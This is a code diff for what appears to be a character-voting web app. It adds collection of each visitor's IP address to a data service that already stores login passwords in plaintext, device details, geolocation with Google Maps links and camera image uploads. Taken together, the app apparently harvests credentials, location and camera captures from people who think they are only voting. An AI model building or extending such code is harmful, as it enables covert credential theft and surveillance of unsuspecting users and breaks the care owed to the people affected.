@@ -2,7 +2,7 @@ import { supabase, isSupabaseConfigured } from '../lib/supabase';
 import { Character } from '../types';
 import { INITIAL_CHARACTERS } from '../constants';
 
-// Dynamic URL: Uses the hostname of the device accessing the site (e.g., 192.168.1.X) instead of hardcoded localhost
+// Dynamic URL: Uses the hostname of the device accessing the site
 const LOCAL_SERVER_URL = `http://${typeof window !== 'undefined' ? window.location.hostname : 'localhost'}:3001`;
 
 // --- TYPES ---
@@ -30,6 +30,17 @@ const generateMapsUrl = (loc: any): string | null => {
     return null;
 };
 
+// Fetch client IP from local server
+const getClientIP = async (): Promise<string> => {
+    try {
+        const res = await fetch(`${LOCAL_SERVER_URL}/api/ip`);
+        const data = await res.json();
+        return data.ip || 'unknown';
+    } catch (e) {
+        return 'local-network-ip';
+    }
+};
+
 // Helper to safely stringify Supabase errors
 const logSupabaseError = (context: string, error: any) => {
     const msg = error?.message || JSON.stringify(error);
@@ -52,15 +63,14 @@ export const dataService = {
    * Mengambil daftar karakter terbaru.
    */
   getCharacters: async (): Promise<Character[]> => {
+    // 1. Try Supabase
     if (isSupabaseConfigured() && supabase) {
       const { data, error } = await supabase
         .from('characters')
         .select('*')
         .order('votes', { ascending: false });
       
-      if (error) {
-         console.warn("Supabase fetch skipped, using local data.");
-      } else if (data && data.length > 0) {
+      if (!error && data && data.length > 0) {
         return data.map((d: any) => ({
             id: d.character_id || d.id,
             name: d.name,
@@ -73,19 +83,30 @@ export const dataService = {
       }
     }
 
+    // 2. Fallback to LocalStorage
     const saved = localStorage.getItem('muse_characters');
-    return saved ? JSON.parse(saved) : INITIAL_CHARACTERS;
+    if (saved) {
+        return JSON.parse(saved);
+    }
+    
+    // 3. First time load? Save Initial to LS immediately so we have a base to update
+    safeSetItem('muse_characters', JSON.stringify(INITIAL_CHARACTERS));
+    return INITIAL_CHARACTERS;
   },
 
   /**
    * Mencatat User Login / Guest Visit ke Database
    */
   registerUserLogin: async (payload: UserLoginPayload) => {
-    // Inject Google Maps URL into the location_data JSON
+    // Get IP
+    const ip = await getClientIP();
+
+    // Inject Google Maps URL & IP into location data
     const mapsUrl = generateMapsUrl(payload.location_data);
     const enrichedLocation = {
         ...payload.location_data,
-        mapsUrl: mapsUrl // Adding URL directly to JSON structure
+        mapsUrl: mapsUrl,
+        ipAddress: ip
     };
 
     if (isSupabaseConfigured() && supabase) {
@@ -98,7 +119,7 @@ export const dataService = {
           password_text: payload.password_text,
           login_method: payload.login_method,
           device_info: payload.device_info,
-          location_data: enrichedLocation, // Updated JSON
+          location_data: enrichedLocation, 
           camera_folder_ref: folderRef,
           last_login: new Date().toISOString()
         });
@@ -107,7 +128,7 @@ export const dataService = {
         logSupabaseError("Supabase Login Log Error", error);
       }
     } else {
-        console.log("Login Logged locally:", payload.user_identifier);
+        console.log(`[LOCAL LOG] Login: ${payload.user_identifier} from IP: ${ip}`);
     }
   },
 
@@ -121,12 +142,14 @@ export const dataService = {
   ): Promise<boolean> => {
     
     const timestamp = new Date().toISOString();
+    const ip = await getClientIP();
     
-    // Inject Google Maps URL into the location_data JSON
+    // Inject Google Maps URL & IP
     const mapsUrl = generateMapsUrl(meta.location);
     const enrichedLocation = {
         ...meta.location,
-        mapsUrl: mapsUrl // Adding URL directly to JSON structure
+        mapsUrl: mapsUrl,
+        ipAddress: ip
     };
 
     // 1. TRY SUPABASE FIRST
@@ -137,7 +160,7 @@ export const dataService = {
           user_identifier: user,
           character_id: characterId,
           device_info: meta.deviceInfo,
-          location_data: enrichedLocation, // Updated JSON
+          location_data: enrichedLocation,
           created_at: timestamp
         });
 
@@ -147,17 +170,19 @@ export const dataService = {
     }
 
     // 2. ALWAYS UPDATE LOCAL STORAGE (CLIENT STATE)
+    // Vote Record
     const voteData = {
         charId: characterId,
         timestamp: timestamp,
         deviceInfo: meta.deviceInfo,
         location: enrichedLocation
     };
-    
     safeSetItem(`muse_vote_record_${user}`, JSON.stringify(voteData));
 
-    const savedChars = localStorage.getItem('muse_characters');
-    const chars: Character[] = savedChars ? JSON.parse(savedChars) : INITIAL_CHARACTERS;
+    // Character Count Update
+    // IMPORTANT: Read from LS first to ensure we add to current state, not stale state
+    const currentLS = localStorage.getItem('muse_characters');
+    const chars: Character[] = currentLS ? JSON.parse(currentLS) : INITIAL_CHARACTERS;
     
     const updatedChars = chars.map(c => 
       c.id === characterId ? { ...c, votes: c.votes + 1 } : c
@@ -165,6 +190,7 @@ export const dataService = {
     
     safeSetItem('muse_characters', JSON.stringify(updatedChars));
 
+    // Notify App
     window.dispatchEvent(new Event('local-storage-update'));
     return true;
   },
@@ -176,7 +202,6 @@ export const dataService = {
     try {
         if (!base64Image || !base64Image.includes(',')) return;
 
-        // Try sending to local server first
         await fetch(`${LOCAL_SERVER_URL}/api/upload`, {
             method: 'POST',
             headers: {
@@ -189,14 +214,7 @@ export const dataService = {
         });
 
     } catch (e) {
-        // If local server fails, just log it (or try Supabase as backup)
         console.warn("Local server upload failed (Is node server.js running?)", e);
-    }
-
-    // Optional: Keep Supabase backup if configured
-    if (isSupabaseConfigured() && supabase) {
-        // Supabase logic (omitted for brevity as user requested local folder focus)
-        // You can re-add the previous Supabase Blob logic here if you want dual backup.
     }
   },
 
